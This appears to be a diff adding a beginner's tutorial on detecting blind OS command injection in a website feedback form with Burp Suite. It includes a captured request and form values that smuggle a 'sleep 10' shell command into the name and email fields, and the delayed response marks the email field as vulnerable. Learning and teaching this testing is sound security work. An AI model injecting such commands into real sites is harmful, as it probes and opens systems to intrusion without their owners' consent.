@@ -1,0 +1,73 @@
+Here is the blind OS command injection. It emans that the output is not visible to us. We can test to see if the web server responds according to the command we inject.
+First, we visit the target website.
+Then, we try to find some forms on the target website like feedback form, comment form, contact us form or whatever forms.
+We have a feedback form here that has 4 fields, name, email, subject and message fields.
+We want to test each field at a time to see which one is vulnerable to blind OS command injcetion.
+
+Fire up the Burp Suite and run the built-in browser.
+Enable intercept function on and copy and paste the URL to it and hit enter.
+The request captured by the Burp now.
+Let's examine it.
+
+POST /feedback/submit HTTP/2
+Host: mywebsite.net
+Cookie: session=zUIVkc9JZM4hREy4oeXWn9f9bVoCwTYr
+Content-Length: 86
+Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+Content-Type: application/x-www-form-urlencoded
+Accept-Language: en-US
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: */*
+Origin: https://mywebsite.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://mywebsite.net/feedback
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+csrf=sbxnz14z5B89jxlhojH1frQFuUaagsli&name=a&email=a%40me.com&subject=a&message=a
+
+We just populated the form with random string and submited it. Now, let's check one by one to see which on responds to our request.
+The easiet way is to chheck with "sleep" command. Make sure to encode the command. In Burp Suite, highlight the command and press ctrl + u to encode the strings.
+
+
+The raw request is this below:
+
+csrf=sbxnz14z5B89jxlhojH1frQFuUaagsli&name=a&email=a%40me.com&subject=a&message=a
+
+Now, we need to test each field one by one to see which one is vulnerable to OS command injection attack
+
+csrf=sbxnz14z5B89jxlhojH1MGQFuUaagsli&name=test+%26+sleep+10+%23&email=a%40me.com&subject=a&message=a
+
+
+Note: If the server respond quickly and does not wait for 10 seconds delay, then the field is not vulnerable to blind OS command injection.
+
+
+Now, let's try email field.
+
+It will be like this 
+
+csrf=sbxnz14z5B89jxlhojH1MGQFuUaagsli&name=a&email=a%40me.com+%26+sleep+10+%23&subject=a&message=a
+
+We can see that the server delayed 10 seconds and responded. So, this email field is vulnerable to OS command injection.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
